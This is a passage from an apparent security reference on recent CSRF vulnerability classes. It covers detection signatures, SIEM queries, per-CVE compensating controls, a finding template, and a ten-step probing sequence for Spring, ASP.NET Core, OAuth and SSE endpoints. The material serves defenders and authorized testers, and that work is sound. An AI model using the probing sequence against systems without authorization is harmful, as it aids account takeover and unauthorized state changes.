**Facebook, Twitter/X, LinkedIn:**
- Historical CSRF issues in OAuth flows; current versions strict.
- Deprecated flow variants (implicit flow, deprecated for public clients) had CSRF-shape risks.

For each provider, verify the current SDK/library version and the client's implementation of RFC 9700 requirements.

## Ecosystem-Level CSRF Trends

Beyond specific CVEs and technique classes, ecosystem-level trends in 2024–2026:

**SPA-first architectures:**
- Modern SPAs increasingly use bearer-token auth (no cookies) — reducing traditional CSRF surface.
- But: hybrid apps (session cookie + API bearer) recreate CSRF surface at the auth-cookie layer.
- SPA-CSRF is not going away — it's shifting to specific hybrid patterns.

**Zero-trust adoption:**
- Enterprise apps adopting zero-trust reduce ambient-authority reliance.
- CSRF's ambient-authority premise is undermined; some enterprise apps are effectively CSRF-immune by design.
- But: consumer-facing apps and legacy enterprise apps retain cookie sessions and thus CSRF surface.

**Passkeys and WebAuthn:**
- Passkey-based auth flows have different CSRF considerations.
- WebAuthn's origin binding provides strong CSRF resistance for the auth flow itself.
- Post-auth state changes still require CSRF protection.

**API-first vs page-based:**
- API-first apps (all state changes via JSON API) increasingly use CORS preflight naturally as CSRF defense.
- Page-based apps (form submissions) retain traditional CSRF surface.

## Detection Signatures for Defenders

**Signal shapes for CSRF exploitation:**

- **Cross-origin STOMP SEND frames** — SIEM on STOMP endpoint logs; alert on SEND frames from unexpected `Origin`.
- **Anti-forgery-token validation failures** — spike detection on `Microsoft.AspNetCore.Antiforgery` failure logs indicates CSRF attempt.
- **OAuth state mismatch on callback** — spike detection on state-mismatch errors indicates OAuth CSRF attempt.
- **SSE endpoint requests from non-app origins** — SIEM on SSE endpoint access logs; alert on cross-origin requests.
- **Rails CSRF token verification failures** — spike on `ActionController::InvalidAuthenticityToken` indicates CSRF attempt.

**SIEM query examples:**

```
# OAuth state mismatch spike
index=oauth_logs event="state_mismatch"
| bin _time span=5m
| stats count by _time, client_id
| where count > 10

# STOMP SEND from unexpected origin
index=stomp_logs frame_type="SEND"
  origin_header NOT LIKE "%.example.com"
| stats count by src_ip, destination
```

**Compensating controls:**

- Fetch Metadata middleware on state-change endpoints (community-tier as of 2026).
- Explicit SameSite=Strict on session cookies where feasible.
- Strict Origin allowlist on WebSocket handshakes.
- Per-endpoint CSRF token validation (no connection-state trust).
- OAuth clients enforcing RFC 9700 (state + PKCE MUST).

## Compensating Controls Reference

For each batch-7 CSRF CVE and technique class, compensating controls that reduce exposure without a full patch:

**CVE-2025-41254 (Spring STOMP):**
- Enable Spring Security's CSRF filter for STOMP endpoints via `configureInbound()`.
- Enforce Origin allowlist on WebSocket handshake.
- Rate-limit STOMP SEND frames per session.
- Use `HttpOnly` + `SameSite=Strict` cookies to reduce CSWSH surface.

**CVE-2025-55315 (ASP.NET Core):**
- Deploy WAF with post-disclosure smuggling signatures.
- Re-validate AntiForgery per-request in the handler (defense-in-depth beyond middleware).
- Front Kestrel with strict-parsing IIS/Nginx/HAProxy.

**CVE-2025-68481 (fastapi-users):**
- Manually add random nonce claim to state JWTs pre-upgrade.
- Reduce state JWT TTL to under 5 minutes.
- Server-side session-binding of state parameter.

**CVE-2025-66629 (HedgeDoc):**
- Add state parameter to OAuth flow at reverse-proxy level (edge-side state injection).
- Deploy WAF rule requiring state parameter on OAuth callback endpoints.

**CVE-2026-46431 (Algernon SSE):**
- Reverse-proxy strips permissive CORS headers on SSE endpoints.
- Move to WebSocket with proper Origin allowlist.
- Reduce SSE payload sensitivity (don't push user tokens or identifying data).

**Rails OTP-XOR technique class:**
- Rotate the session CSRF secret on privilege change.
- Add per-endpoint CSRF token binding.
- Use HMAC-signed tokens instead of OTP-XOR (custom middleware).

## Testing Sequencing for CSRF Frontier

For a target where multiple 2024–2026 CSRF classes may apply, sequence testing to maximize coverage with minimum noise:

1. **Session mechanism fingerprinting** — cookie / bearer / hybrid.
2. **Framework fingerprinting** — Spring / ASP.NET Core / Rails / Django / Express / other.
3. **CSRF middleware coverage inventory** — which routes have CSRF protection, which don't (via source review if available).
4. **CVE-2025-55315 smuggling probe** — if ASP.NET Core, test smuggling class first (see smuggling novel).
5. **CVE-2025-41254 STOMP CSRF probe** — if Spring, test WebSocket/STOMP endpoints.
6. **OAuth state validation probes** — if OAuth flows present.
7. **SSE CORS probe** — if streaming endpoints present.
8. **Fetch Metadata coverage** — for each state-change endpoint, test with cross-site Sec-Fetch-Site.
9. **SameSite explicitness audit** — inspect Set-Cookie headers.
10. **Cross-browser matrix** — reproduce findings on Chrome, Firefox, Safari.

Read-only tests first (fingerprinting, header inspection); destructive tests after authorization.

## Documenting Class Findings vs CVE Findings

Applied to CSRF:

- **CVE finding:** "Target runs Spring Framework 6.2.10; affected by CVE-2025-41254 (STOMP CSRF). STOMP SEND frame `X` executed state change `Y` from cross-origin session. Fix: upgrade `spring-websocket` to 6.2.12+."
- **Class finding:** "Target's Node.js WebSocket app doesn't validate `Sec-Fetch-Site` on subprotocol messages; a Socket.IO event `X` from cross-origin session triggered state change `Y`. Not a specific CVE — the class is CSRF-at-messaging-layer. Fix: apply CSRF validation to every messaging-layer state-change handler."

Report both when both apply.

## Tools and References

- **CSRF-frontier research artifacts** — persisted at `.zen-batch-artifacts/batch-7-*/research/csrf-frontier-research.md`.
- **RFC 9700 (OAuth 2.0 Security BCP)** — the primary source for the OAuth state/PKCE upgrade to MUST.
- **CVE-2025-41254 primary source** — [spring.io/security/cve-2025-41254/](https://spring.io/security/cve-2025-41254/).
- **CVE-2025-55315 primary source** — Microsoft Security Response Center (MSRC) advisory; also referenced in `http_request_smuggling_novel_deep.md`.
- **Fetch Metadata specification** — `w3c.github.io/webappsec-fetch-metadata/`; the browser-side headers spec.
- **SameSite Chrome status** — `chromium.org/updates/same-site/`; the source of the Lax-by-default rollout.
- **Rails OTP-XOR technique writeup** — security-vendor blog (gbhackers, others); no CVE assigned.

## Class-Recurrence Rate and Prediction

Based on the 2024–2026 CSRF-frontier surface:

- **CSRF class recurrence rate**: ~5–10 CSRF-adjacent CVEs per year across major frameworks and libraries.
- **Recurrence patterns**:
  - Every new session mechanism (bearer tokens, JWT-in-cookies, WebAuthn) introduces new CSRF-shape considerations.
  - Every new browser feature (Fetch, EventSource, WebSocket, WebTransport) creates new preflight and credential-forwarding behaviors.
  - Every new content-type (application/graphql, application/msgpack, custom) creates parser-differential opportunities.
  - Every new deployment topology (SPA + separate API, microservices with per-service auth) creates new trust-boundary considerations.

**Prediction for 2026–2027:**

- Expect Fetch Metadata middleware to ship in at least one major framework as default.
- Expect at least 5 more CVEs in the OAuth CSRF class (RFC 9700 codified the requirements; enforcement is uneven).
- Expect WebTransport CSRF class disclosures as WebTransport rolls out.
- Expect more messaging-layer CSRF classes analogous to Spring STOMP (Socket.IO, MQTT-over-WebSocket).
- Expect chain-into-CSRF classes (like CVE-2025-55315) as smuggling and other primitives are combined.

**Frontier assessment:**

The CSRF novel frontier is genuinely rich — five verified CVEs plus five distinct technique classes plus multiple regression patterns. The class is durable and evolving; expect continued surface expansion.

## WebTransport / QUIC-Handshake CSRF — Emerging Frontier

WebTransport is a new browser API (Chrome 97+, in progress in Firefox/Safari as of the batch cutoff) for QUIC-based bidirectional communication. Its CSRF surface is emerging:

**Structural properties:**

- WebTransport handshake is a distinct HTTP/3 request with `:method: CONNECT`, `:protocol: webtransport`.
- Origin is transmitted; server can validate.
- Credentials attached similar to WebSocket.

**Emerging CSRF class:**

- WebTransport handshake without Origin allowlist is CSWSH-equivalent for QUIC.
- Server-Sent WebTransport datagrams may leak user-scoped data cross-origin (analogous to SSE-CSRF).

**Detection:**

- Fingerprint WebTransport endpoints (`Alt-Svc: h3=":443"` + WebTransport-specific paths).
- Test handshake with attacker-controlled Origin.
- Verify server-side Origin allowlist.

**Frontier framing:**

The WebTransport CSRF class is genuinely emerging — very few production deployments as of 2026, minimal CVE surface. Document as class-shape only; expect the CVE surface to grow as WebTransport rolls out.

## Batch-7 Manifest Reference

For the batch-7 manifest with 1:1 persistence accounting, see `.zen-batch-artifacts/batch-7-20260929-165210/manifest.md`. Every CSRF CVE cited in this file has a corresponding NVD JSON at `.../cve-json/` and, where applicable, GHSA JSON at `.../ghsa-json/`. The HedgeDoc GHSA-6wm6-3vpq-6qvv is repo-scoped only (not in the global GHSA database) — advisory HTML persisted separately.

## Assessment Deliverable Template

For CSRF findings at the current frontier, the deliverable should include:

- **Class or CVE anchor** — cite CVE-2025-41254/CVE-2025-55315/etc. where applicable, or the technique class (SSE-CSRF, Rails OTP-XOR) where CVE-less.
- **Target framework + version** — Spring / ASP.NET Core / Rails / Node with specific version.
- **CSRF middleware posture** — token / SameSite / Fetch Metadata / Origin check (or combination).
- **Delivery vector used** — form POST, JSON via text/plain, GraphQL, WebSocket, SSE, sub-resource.
- **Confirmation evidence** — state change with before/after; cross-browser matrix if relevant.
- **Impact chain** — downstream class the CSRF reaches (account takeover, data disclosure, financial action).
- **Version boundary** — where the fix landed, or where the target's version sits in the affected range.
- **Compensating controls** — what reduces exposure per the CVE / class.

## Summary

The 2024–2026 CSRF frontier is anchored by five verified CVEs across Spring (STOMP CSRF class), ASP.NET Core (smuggling→AntiForgery-bypass twofer), the OAuth cluster (fastapi-users + HedgeDoc state-parameter class), Algernon (SSE-CSRF class anchor), plus the Rails OTP-XOR framework-wide technique class. The RFC 9700 shift (Jan 2025) codifies state and PKCE as MUST for OAuth 2.0 clients. Fetch Metadata middleware remains community-tier — no major framework ships it as default as of the batch cutoff. SameSite Lax-by-default is durable across browsers with no 2024–2026 regression. Fingerprint every target's specific stack; verify per-CVE version scope; distinguish class findings from CVE findings; and route composite chains to sibling skills for downstream impact.
